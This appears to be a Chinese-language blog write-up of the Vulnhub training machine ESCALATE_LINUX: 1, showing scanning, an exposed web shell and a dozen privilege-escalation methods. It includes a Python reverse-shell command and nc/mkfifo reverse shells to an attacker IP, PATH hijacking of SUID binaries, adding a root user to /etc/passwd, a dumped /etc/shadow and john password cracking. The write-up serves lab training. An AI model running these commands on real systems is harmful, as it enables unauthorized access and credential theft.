---
title: Vulnhub-ESCALATE_LINUX: 1
date: 2024-03-19  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Escalate-linux.html"
---

# ESCALATE_LINUX: 1

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201583.png" alt="image-20240318133009728" style="zoom:50%;" />

打开发现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201585.png" alt="image-20240319180456358" style="zoom: 67%;" />

扫描一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201586.png" alt="image-20240319180827229" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201587.png" alt="image-20240319180848343" style="zoom:50%;" />

看样子没错了，开始渗透吧：

## 信息搜集

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201588.png" alt="image-20240319180932894" style="zoom:50%;" />

### 端口扫描

```bash
rustscan -a http://10.160.3.85/ -- -A -sV -sT -T4 --script=vuln
```

```apl
Open 10.160.3.85:80
Open 10.160.3.85:111
Open 10.160.3.85:139
Open 10.160.3.85:445
Open 10.160.3.85:2049
Open 10.160.3.85:39021
Open 10.160.3.85:40589
Open 10.160.3.85:49713
Open 10.160.3.85:55409
```

```text
80/tcp    open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp  open  nfs         syn-ack 3-4 (RPC #100003)
39021/tcp open  mountd      syn-ack 1-3 (RPC #100005)
40589/tcp open  nlockmgr    syn-ack 1-4 (RPC #100021)
49713/tcp open  mountd      syn-ack 1-3 (RPC #100005)
55409/tcp open  mountd      syn-ack 1-3 (RPC #100005)
```

### 目录扫描

```bash
dirsearch -u http://10.160.3.85 -e* -i 200,300-399
```

```bash
/shell.php
```

啊这。。。

## 漏洞利用

打开看一下：

```text
/*pass cmd as get parameter*/
```

直接给shell了，这。。。

![image-20240319181802289](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201589.png)

弹一个shell吧。。。。

```bash
http://10.160.3.85/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.161.181.188",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201591.png" alt="image-20240319182621866" style="zoom:50%;" />

## 提权

### 信息搜集

![image-20240319182900787](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201592.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201593.png" alt="image-20240319182926405" style="zoom:50%;" />

![image-20240319182940552](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201594.png)

上传一个`linpeas.sh`搜集一波：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201595.png" alt="image-20240319183441804" style="zoom:50%;" />

### 方法一：shell文件赋权user3

看到一个`suid`文件`user3`的shell文件，看一下内容，发现会乱码，是`ELF`文件，传过来看看：

![image-20240319184446275](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201596.png)

反汇编一下主函数：

```c
//main.c
undefined8 main(void)
{
    setuid(0);
    setgid(0);
    system(0x7a4);
    return 0;
}
```

直接赋权。。。。行吧，运行一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201597.png" alt="image-20240319184816344" style="zoom:50%;" />

### 方法二：user5 script赋权

同方法一，把他拿过来，反编译一下`/home/user5/script`

```c
// main.c
undefined8 main(void)
{
    setuid(0);
    setgid(0);
    system(0x7a4);
    return 0;
}
```

也是一个赋权脚本，同一，但是我运行的时候相当与`ls`，不知道为啥。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201598.png" alt="image-20240319190041447" style="zoom:50%;" />

查看一下有无隐藏文件，隐藏文件没找到，发现这俩文件有猫腻：

```bash
-rwxrwxr-x  1 user5 user5   26 Jun  4  2019 ls
-rwsr-xr-x  1 root  root  8392 Jun  4  2019 script
```

```bash
// ls
cat ls
id
whoami
cat /etc/shadow
```

运行一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201599.png" alt="image-20240319191232130" style="zoom:33%;" />

猜测`script`是执行了`ls`，改一下环境变量就行了！

```bash
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
echo $PATH
export PATH=$PWD:$PATH
cd /home/user5
./script
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201600.png" alt="image-20240319191104970" style="zoom: 33%;" />

### 方法三：定时任务提权user4

在`crontab`中，每5分钟使用`root`特权运行`autoscript.sh`文件。

```bash
cat /home/user4/Desktop/autoscript.sh
touch /home/user4/abc.txt
echo "I will automate the process"
bash -i
```

利用一下：

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.161.181.188 2345 >/tmp/f" > autoscript.sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201601.png" alt="image-20240319192737132" style="zoom:50%;" />

权限不够，使用之前的脚本将密码修改一下：

```bash
cd /tmp
echo 'echo "user4:fucku" | chpasswd' > ls
chmod +x ls
export PATH=$PWD:$PATH
cd /home/user5 
./script
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201602.png" alt="image-20240319193338206" style="zoom:33%;" />

切换到这里，再返回进行修改：

```bash
echo "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.161.181.188 2345 >/tmp/f" > autoscript.sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201603.png" alt="image-20240319193625982" style="zoom:50%;" />

获取root权限！但是这种方法有点拿到root再找root的感觉，接下来不这么做了。

### 方法四：nfs+suid

扫描发现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201604.png" alt="image-20240319194306197" style="zoom: 50%;" />

这个配置允许网络中的任何主机以读写的方式访问 `/home/user5` 目录，并且root用户在该共享目录下具有完整的权限。

```bash
# kali
cd tmp
mkdir Escalate_Linux
sudo su
mount -t nfs 10.160.3.85:/home/user5 /tmp/Escalate_Linux/
cd /tmp/Escalate_Linux/
cp /bin/sh rootme
chmod 4755 rootme
```

按理说是可以的，但是机器的库版本有点低，执行不了这个`bash`。先搁置吧。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201605.png" alt="image-20240319195345514" style="zoom:50%;" />

### 方法五：mysql + 超级用户user1

刚刚端口扫描是扫到了mysql的，而且`etc/passwd`显示mysql也有`/bin/bash`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201606.png" alt="image-20240319195722594" style="zoom: 50%;" />

查看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201607.png" alt="image-20240319195827726" style="zoom:50%;" />

额，登录一下`mysql`试着读取吧，尝试若口令即可登录：

```bash
mysql -uroot -proot
show databases;
use user;
show tables;
select * from user_info;
```

获取到了`mysql`用户，尝试切换！

```apl
+----------+-------------+
| username | password    |
+----------+-------------+
| mysql    | mysql@12345 |
+----------+-------------+
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201608.png" alt="image-20240319200320204" style="zoom:33%;" />

获取到了flag，尝试登录，发现失败：

```bash
mysql@osboxes:/etc/mysql$ su root 
su root
Password: root@12345
su: Authentication failure
```

按照这个样式尝试其他用户：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201609.png" alt="image-20240319200534846" style="zoom:50%;" />

进入`user1`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201610.png" alt="image-20240319200631708" style="zoom: 33%;" />

事实上，这里不用猜也可以找到密码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201611.png" alt="image-20240319213507013" style="zoom: 50%;" />

### 方法六 mysql 超级用户user1

进`user2`，查看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201612.png" alt="image-20240319212827304" style="zoom:50%;" />

发现`user1`的特殊性：

```bash
sudo -u user1 bash
```

进入`user1`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201610.png" alt="image-20240319200631708" style="zoom: 33%;" />

### 方法七：特权用户user7

登录一下`user7`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201613.png" alt="image-20240319201322197" style="zoom: 50%;" />

添加新root用户：

```bash
# kali
openssl passwd -1 -salt hack hack@12345
# user7
echo 'hack:$1$hack$iSJ/mXJe8rRxVN4fxqhbJ1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201614.png" alt="image-20240319202954726" style="zoom:50%;" />

### 方法八：user8 vi提权

切换至`user8`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201615.png" alt="image-20240319200920095" style="zoom: 50%;" />

发现`vi`权限过高，尝试提权：

```bash
vi
:!sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201616.png" alt="image-20240319201153704" style="zoom:33%;" />

### 方法九：弱口令登录root

一直在切换突发奇想，root密码不会是`12345`吧，尝试登录，成功：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201617.png" alt="image-20240319201800839" style="zoom:50%;" />

### 方法十：user4 添加root用户

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201618.png" alt="image-20240319211912056" style="zoom:50%;" />

说明`user4`也可以修改`passwd`

### 方法十一：user3 .script.sh

使用密码`user3@12345`切换到`user3`，发现也存在一个这样的程序：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201619.png" alt="image-20240319212243386" style="zoom:50%;" />

提权方法同方法三。

### 方法十二：john爆破密码

在`user5`中如果我们换一种方法：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201620.png" alt="image-20240319213819773" style="zoom:50%;" />

详细内容如下：

```text
root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::
daemon:x:17995:0:99999:7:::
bin:x:17995:0:99999:7:::
sys:x:17995:0:99999:7:::
sync:x:17995:0:99999:7:::
games:x:17995:0:99999:7:::
man:x:17995:0:99999:7:::
lp:x:17995:0:99999:7:::
mail:x:17995:0:99999:7:::
news:x:17995:0:99999:7:::
uucp:x:17995:0:99999:7:::
proxy:x:17995:0:99999:7:::
www-data:x:17995:0:99999:7:::
backup:x:17995:0:99999:7:::
list:x:17995:0:99999:7:::
irc:x:17995:0:99999:7:::
gnats:x:17995:0:99999:7:::
systemd-timesync:x:17995:0:99999:7:::
systemd-network:x:17995:0:99999:7:::
systemd-resolve:x:17995:0:99999:7:::
syslog:x:17995:0:99999:7:::
_apt:x:17995:0:99999:7:::
messagebus:x:17995:0:99999:7:::
uuidd:x:17995:0:99999:7:::
lightdm:x:17995:0:99999:7:::
ntp:x:17995:0:99999:7:::
avahi:x:17995:0:99999:7:::
colord:x:17995:0:99999:7:::
dnsmasq:x:17995:0:99999:7:::
hplip:x:17995:0:99999:7:::
nm-openconnect:x:17995:0:99999:7:::
nm-openvpn:x:17995:0:99999:7:::
pulse:x:17995:0:99999:7:::
rtkit:x:17995:0:99999:7:::
saned:x:17995:0:99999:7:::
usbmux:x:17995:0:99999:7:::
geoclue:x:17995:0:99999:7:::
nobody:x:17995:0:99999:7:::
vboxadd:!:17995::::::
user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::
user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::
user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::
user4:$6$h6g0Qcxj$axLcacCkw4f/h8g0VM04LOYCC/iYwNWo9Z9K3toV87CT6Mr4J0YMzgN1tZWQqosVuvtlTWvNUzQmgaXtBRKXr1:19801:0:99999:7:::
statd:*:18051:0:99999:7:::
user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::
user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::
mysql:$6$O2ymBAYF$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::
user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::
user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::
```

使用`john`进行爆破！

```bash
john --wordlist=/usr/share/john/password.lst --rules passwd
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403192201621.png" alt="image-20240319220013148" style="zoom:50%;" />

# 参考blog

https://dpalbd.wordpress.com/ctf-writeup-escalate_linux-1/

https://blog.csdn.net/qq_34801745/article/details/104144580
